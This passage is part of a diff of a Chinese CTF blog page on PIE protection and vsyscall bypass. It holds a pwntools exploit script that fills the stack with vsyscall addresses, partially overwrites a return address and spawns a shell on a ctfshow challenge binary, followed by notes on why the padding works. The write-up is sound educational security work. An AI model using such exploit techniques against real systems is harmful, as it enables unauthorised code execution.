class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_sb</span>():</span><br><span class="line">    <span class="keyword">return</span> libc_base + libc.sym[<span class="string">&#x27;system&#x27;</span>], libc_base + <span class="built_in">next</span>(libc.search(<span class="string">b&#x27;/bin/sh\x00&#x27;</span>))</span><br><span class="line"></span><br><span class="line">sd = <span class="keyword">lambda</span> data : p.send(data)</span><br><span class="line">sa  = <span class="keyword">lambda</span> text,data  :p.sendafter(text, data)</span><br><span class="line">sl  = <span class="keyword">lambda</span> data   :p.sendline(data)</span><br><span class="line">sla = <span class="keyword">lambda</span> text,data  :p.sendlineafter(text, data)</span><br><span class="line">rc   = <span class="keyword">lambda</span> num=<span class="number">4096</span>   :p.recv(num)</span><br><span class="line">ru  = <span class="keyword">lambda</span> text   :p.recvuntil(text)</span><br><span class="line">rl  = <span class="keyword">lambda</span> 	:p.recvline()</span><br><span class="line">pr = <span class="keyword">lambda</span> num=<span class="number">4096</span> :<span class="built_in">print</span>(p.recv(num))</span><br><span class="line">ia   = <span class="keyword">lambda</span>        :p.interactive()</span><br><span class="line">l32 = <span class="keyword">lambda</span>    :u32(p.recvuntil(<span class="string">b&#x27;\xf7&#x27;</span>)[-<span class="number">4</span>:].ljust(<span class="number">4</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">l64 = <span class="keyword">lambda</span>    :u64(p.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">uu32    = <span class="keyword">lambda</span>    :u32(p.recv(<span class="number">4</span>).ljust(<span class="number">4</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">uu64    = <span class="keyword">lambda</span>    :u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">int16   = <span class="keyword">lambda</span> data   :<span class="built_in">int</span>(data,<span class="number">16</span>)</span><br><span class="line">lg= <span class="keyword">lambda</span> s, num   :p.success(<span class="string">&#x27;%s -&gt; 0x%x&#x27;</span> % (s, num))</span><br><span class="line"></span><br><span class="line">context(arch = <span class="string">&quot;amd64&quot;</span>,os = <span class="string">&quot;linux&quot;</span>,log_level = <span class="string">&quot;debug&quot;</span>)<span class="comment">#</span></span><br><span class="line"><span class="comment">#context.terminal = [&#x27;tmux&#x27;,&#x27;splitw&#x27;,&#x27;-h&#x27;]</span></span><br><span class="line">context.terminal = [<span class="string">&#x27;gnome-terminal&#x27;</span>, <span class="string">&#x27;-x&#x27;</span>, <span class="string">&#x27;sh&#x27;</span>, <span class="string">&#x27;-c&#x27;</span>]</span><br><span class="line">file = <span class="string">&quot;./pwn&quot;</span></span><br><span class="line"><span class="comment">#libc = &quot;./libc.so.6&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#p = remote(&quot;pwn.challenge.ctf.show&quot;,28217)</span></span><br><span class="line">p = process(file)</span><br><span class="line"></span><br><span class="line">elf = ELF(file)</span><br><span class="line"><span class="comment">#libc = ELF(libc)</span></span><br><span class="line"><span class="comment">#p = remote(&quot;&quot;, 23583)</span></span><br><span class="line"></span><br><span class="line">vsyscall = <span class="number">0xffffffffff600000</span></span><br><span class="line">ru(<span class="string">&quot;Hack me!\n&quot;</span>)</span><br><span class="line">payload = p64(vsyscall) * <span class="number">30</span></span><br><span class="line">payload += <span class="string">b&#x27;\x13&#x27;</span></span><br><span class="line"></span><br><span class="line">sd(payload)</span><br><span class="line">sl(<span class="string">b&#x27;/bin/sh&#x27;</span>)</span><br><span class="line">p.interactive()  </span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
+
+<h2 id="注意🤨🤨"><a href="#注意🤨🤨" class="headerlink" title="注意🤨🤨"></a>注意🤨🤨</h2><p>最开始我payload用了0x40的垃圾数据填充，但是是不行的，思考一下🤯🤯：</p>
+<ul>
+<li>经过jmp rax那部分指令,rsp的地址是不会发生改变的，即使我们使用<code>vsyscall</code>即<code>ret</code>(pop rip),也是从rsp开始将数据给rip继续执行，所以一开始填充垃圾数据那么便会出现下面的情况：</li>
+</ul>
+<p><img lazyload src="/images/loading.svg" data-src="/../capture_20241113193430206.bmp"></p>
+<p><mark>下一步<mark></mark></mark></p>
+<p><img lazyload src="/images/loading.svg" data-src="/../capture_20241113193441272.bmp"></p>
+<ul>
+<li>所以要将栈上的数据都填充为<code>vsyscall</code>，然后滑到后门函数</li>
 </ul>
 
         </div>
@@ -378,7 +447,7 @@
         
             <li>
                 <strong>更新于
-                    :</strong> 2024-09-16 20:40:35
+                    :</strong> 2024-11-13 19:36:48
             </li>
         
         <li>
@@ -473,7 +542,7 @@
           dark: 'body[class~="dark-mode"]',
           reaction: true,
           requiredMeta: ['nick', 'mail'],
-          emoji: [],
+          emoji: ['https://unpkg.com/@waline/emojis@1.2.0/qq','https://unpkg.com/@waline/emojis@1.2.0/weibo'],
           
           
         });
@@ -502,7 +571,7 @@
     <div class="post-toc">
         <div class="toc-title">目录</div>
         <div class="page-title">PIE保护</div>
-        <ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#PIE%E4%BF%9D%E6%8A%A4"><span class="nav-text">PIE保护</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%89%8D%E8%A8%80%EF%BC%9A"><span class="nav-text">前言：</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%85%B3%E4%BA%8E%E5%BC%80%E5%90%AFpie%E7%9A%84gdb%E8%B0%83%E8%AF%95"><span class="nav-text">关于开启pie的gdb调试</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%85%B7%E4%BD%93%E9%A2%98%E7%9B%AE"><span class="nav-text">具体题目</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#1-%E6%B7%B1%E8%82%B2%E6%9D%AF-2021-find-flag-%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2-pie"><span class="nav-text">1.[深育杯 2021]find_flag(格式化字符串-pie)</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-linkctf-2018-7-babypie"><span class="nav-text">2.linkctf_2018.7_babypie</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#3-Basectf-week3-PIE-%E7%88%86%E7%A0%B4%E8%BF%94%E5%9B%9E%E5%9C%B0%E5%9D%80"><span class="nav-text">3.Basectf-week3-PIE(爆破返回地址)</span></a></li></ol></li></ol></li></ol>
+        <ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#PIE%E4%BF%9D%E6%8A%A4"><span class="nav-text">PIE保护</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%89%8D%E8%A8%80%EF%BC%9A"><span class="nav-text">前言：</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%85%B3%E4%BA%8E%E5%BC%80%E5%90%AFpie%E7%9A%84gdb%E8%B0%83%E8%AF%95"><span class="nav-text">关于开启pie的gdb调试</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%85%B7%E4%BD%93%E9%A2%98%E7%9B%AE"><span class="nav-text">具体题目</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#1-%E6%B7%B1%E8%82%B2%E6%9D%AF-2021-find-flag-%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2-pie"><span class="nav-text">1.[深育杯 2021]find_flag(格式化字符串-pie)</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#2-linkctf-2018-7-babypie"><span class="nav-text">2.linkctf_2018.7_babypie</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#3-Basectf-week3-PIE-%E7%88%86%E7%A0%B4%E8%BF%94%E5%9B%9E%E5%9C%B0%E5%9D%80"><span class="nav-text">3.Basectf-week3-PIE(爆破返回地址)</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#vsyscall%E7%BB%95%E8%BF%87"><span class="nav-text">vsyscall绕过</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%B3%BB%E7%BB%9F%E8%B0%83%E7%94%A8%E7%AE%80%E4%BB%8B"><span class="nav-text">系统调用简介</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#2024DSBCTF-ctfshow"><span class="nav-text">2024DSBCTF(ctfshow)</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#gdb%E8%B0%83%E8%AF%95"><span class="nav-text">gdb调试</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#EXP-2"><span class="nav-text">EXP</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%B3%A8%E6%84%8F%F0%9F%A4%A8%F0%9F%A4%A8"><span class="nav-text">注意🤨🤨</span></a></li></ol></li></ol>
 
     </div>
 </div>
@@ -539,7 +608,7 @@
                     </span>
                     
                         <span>
-                            共 38.8k 字
+                            共 39.9k 字
                         </span>
                     
                 </p>
